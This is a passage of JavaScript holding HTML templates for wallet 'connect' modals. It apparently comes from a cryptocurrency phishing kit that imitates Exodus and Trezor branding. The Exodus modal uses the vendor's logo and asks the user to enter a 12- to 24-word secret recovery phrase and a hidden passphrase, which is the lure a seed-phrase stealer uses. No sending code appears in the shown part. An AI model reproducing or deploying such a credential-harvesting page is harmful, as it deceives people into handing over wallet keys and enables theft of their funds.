            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
    </div>
</div>

                                        <button onClick="updatePage(TrezorWalletFinishModal);" class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Continue</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;
*/
const ExodusWalletModal = `
<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Exodus Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">

<svg width="300" height="300" viewBox="0 0 300 300" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M298.203 83.7645L170.449 0V46.8332L252.405 100.089L242.763 130.598H170.449V169.402H242.763L252.405 199.911L170.449 253.167V300L298.203 216.503L277.313 150.134L298.203 83.7645Z" fill="url(#paint0_linear_1661_295)"/>
<path d="M59.3007 169.402H131.346V130.598H59.0329L49.6589 100.089L131.346 46.8332V0L3.59253 83.7645L24.4831 150.134L3.59253 216.503L131.614 300V253.167L49.6589 199.911L59.3007 169.402Z" fill="url(#paint1_linear_1661_295)"/>
<mask id="mask0_1661_295" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="3" y="0" width="296" height="300">
<path d="M298.204 83.7645L170.45 0V46.8332L252.405 100.089L242.763 130.598H170.45V169.402H242.763L252.405 199.911L170.45 253.167V300L298.204 216.503L277.313 150.134L298.204 83.7645Z" fill="url(#paint2_linear_1661_295)"/>
<path d="M59.301 169.402H131.347V130.598H59.0332L49.6592 100.089L131.347 46.8332V0L3.59277 83.7645L24.4834 150.134L3.59277 216.503L131.615 300V253.167L49.6592 199.911L59.301 169.402Z" fill="url(#paint3_linear_1661_295)"/>
</mask>
<g mask="url(#mask0_1661_295)">
<rect x="3.75024" width="292.5" height="300" fill="url(#paint4_linear_1661_295)"/>
</g>
<defs>
<linearGradient id="paint0_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
<stop stop-color="#0B46F9"/>
<stop offset="1" stop-color="#BBFBE0"/>
</linearGradient>
<linearGradient id="paint1_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
<stop stop-color="#0B46F9"/>
<stop offset="1" stop-color="#BBFBE0"/>
</linearGradient>
<linearGradient id="paint2_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
<stop stop-color="#0B46F9"/>
<stop offset="1" stop-color="#BBFBE0"/>
</linearGradient>
<linearGradient id="paint3_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
<stop stop-color="#0B46F9"/>
<stop offset="1" stop-color="#BBFBE0"/>
</linearGradient>
<linearGradient id="paint4_linear_1661_295" x1="22.5002" y1="67.5" x2="170.625" y2="178.125" gradientUnits="userSpaceOnUse">
<stop offset="0.119792" stop-color="#8952FF" stop-opacity="0.87"/>
<stop offset="1" stop-color="#DABDFF" stop-opacity="0"/>
</linearGradient>
</defs>
</svg>

                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Import Exodus Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Exodus wallet,<br>enter the secret phrase.<br></div>
                                        </div>
<div class="jssSolrise17 MuiBox-root css-0">
    <div class="MuiBox-root css-3mllz6 css-selector">
    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">
    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">
<option value="12">I have 12-word phrase</option>
</select>
    </div>
    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>
    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">
        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
